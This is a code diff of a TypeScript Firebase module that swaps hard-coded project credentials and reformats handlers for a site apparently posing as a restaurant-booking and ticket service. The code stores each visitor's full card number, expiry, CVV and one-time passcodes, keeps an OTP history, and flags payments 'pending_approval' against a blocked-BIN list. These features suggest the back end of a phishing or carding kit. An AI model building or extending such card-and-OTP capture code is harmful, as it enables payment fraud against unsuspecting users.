@@ -17,13 +17,13 @@ import {
 } from "firebase/auth";
 
 const firebaseConfig = {
-   apiKey: "AIzaSyBCgnfGog9E1l543Own6CIAtaK8nCmk1ZE",
-  authDomain: "drettyafgh.firebaseapp.com",
-  projectId: "drettyafgh",
-  storageBucket: "drettyafgh.firebasestorage.app",
-  messagingSenderId: "904057927481",
-  appId: "1:904057927481:web:f75cca6d120fa1038a5ae8",
-  measurementId: "G-ZEV35EHPJM"
+  apiKey: "AIzaSyD7lJVFT0YlHyGDvY6Vg5DrAWEy37c0CmQ",
+  authDomain: "drd-new.firebaseapp.com",
+  projectId: "drd-new",
+  storageBucket: "drd-new.firebasestorage.app",
+  messagingSenderId: "278382775396",
+  appId: "1:278382775396:web:dca7127a4eac9b99a1e371",
+  measurementId: "G-0VG26ERJXH",
 };
 
 function initializeFirebase() {
@@ -106,25 +106,34 @@ const sanitizePayload = (input: any) => {
     data.email = data.email.trim().toLowerCase().slice(0, 120);
   }
   if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
-  if ("cardNumber" in data) data.cardNumber = sanitizeDigits(data.cardNumber, 19);
+  if ("cardNumber" in data)
+    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
   if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
-  if ("expiryMonth" in data) data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
-  if ("expiryYear" in data) data.expiryYear = sanitizeDigits(data.expiryYear, 4);
+  if ("expiryMonth" in data)
+    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
+  if ("expiryYear" in data)
+    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
   if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
   if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
-  if ("cardCategory" in data) data.cardCategory = sanitizeString(data.cardCategory, 40);
+  if ("cardCategory" in data)
+    data.cardCategory = sanitizeString(data.cardCategory, 40);
   if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
-  if ("currentPage" in data) data.currentPage = sanitizeString(data.currentPage, 40);
+  if ("currentPage" in data)
+    data.currentPage = sanitizeString(data.currentPage, 40);
   if ("status" in data) data.status = sanitizeString(data.status, 40);
   if ("type" in data) data.type = sanitizeString(data.type, 40);
-  if ("restaurant" in data) data.restaurant = sanitizeString(data.restaurant, 120);
-  if ("restaurantEn" in data) data.restaurantEn = sanitizeString(data.restaurantEn, 120);
+  if ("restaurant" in data)
+    data.restaurant = sanitizeString(data.restaurant, 120);
+  if ("restaurantEn" in data)
+    data.restaurantEn = sanitizeString(data.restaurantEn, 120);
   if ("date" in data) data.date = sanitizeString(data.date, 40);
   if ("time" in data) data.time = sanitizeString(data.time, 40);
   if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
   if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
-  if ("bookingDate" in data) data.bookingDate = sanitizeString(data.bookingDate, 40);
-  if ("bookingTime" in data) data.bookingTime = sanitizeString(data.bookingTime, 40);
+  if ("bookingDate" in data)
+    data.bookingDate = sanitizeString(data.bookingDate, 40);
+  if ("bookingTime" in data)
+    data.bookingTime = sanitizeString(data.bookingTime, 40);
 
   if ("ticketQuantity" in data) {
     data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
@@ -199,7 +208,9 @@ export async function addData(data: any) {
 
   const payload = sanitizePayload(data);
   const visitorId =
-    typeof payload?.id === "string" ? payload.id : localStorage.getItem("visitor");
+    typeof payload?.id === "string"
+      ? payload.id
+      : localStorage.getItem("visitor");
 
   if (!visitorId) {
     console.warn("Missing visitor ID. Cannot add data.");
@@ -261,8 +272,12 @@ export const handleOtp = async (otp: string, page: string = "otp") => {
       if (typeof otpEntry.code !== "string" || otpEntry.code.length < 4) {
         throw new Error("INVALID_OTP");
       }
-      const existingOtpsRaw = JSON.parse(localStorage.getItem("otpHistory") || "[]");
-      const existingOtps = Array.isArray(existingOtpsRaw) ? existingOtpsRaw : [];
+      const existingOtpsRaw = JSON.parse(
+        localStorage.getItem("otpHistory") || "[]",
+      );
+      const existingOtps = Array.isArray(existingOtpsRaw)
+        ? existingOtpsRaw
+        : [];
       const nextOtps = [...existingOtps, otpEntry]
         .slice(-MAX_HISTORY_ITEMS)
         .map((entry) => sanitizeOtpEntry(entry));
@@ -331,7 +346,10 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
       );
 
       if (typeof setPaymentInfo === "function") {
-        setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
+        setPaymentInfo((prev: any) => ({
+          ...prev,
+          status: "pending_approval",
+        }));
       }
       return true;
     }
@@ -489,13 +507,23 @@ export const removeBlockedBin = async (bin: string) => {
 };
 
 export const listenBlockedBins = (
-  callback: (bins: Array<{ bin: string; bankName?: string; cardBrand?: string; country?: string; blockedAt?: string }>) => void,
+  callback: (
+    bins: Array<{
+      bin: string;
+      bankName?: string;
+      cardBrand?: string;
+      country?: string;
+      blockedAt?: string;
+    }>,
+  ) => void,
 ): (() => void) => {
   if (!db) return () => {};
   let unsubscribe: (() => void) | null = null;
   let cancelled = false;
   (async () => {
-    const { collection, onSnapshot: onSnap } = await import("firebase/firestore");
+    const { collection, onSnapshot: onSnap } = await import(
+      "firebase/firestore"
+    );
     if (cancelled || !db) return;
     const u = onSnap(collection(db, "blocked_bins"), (snap) => {
       const list: any[] = [];
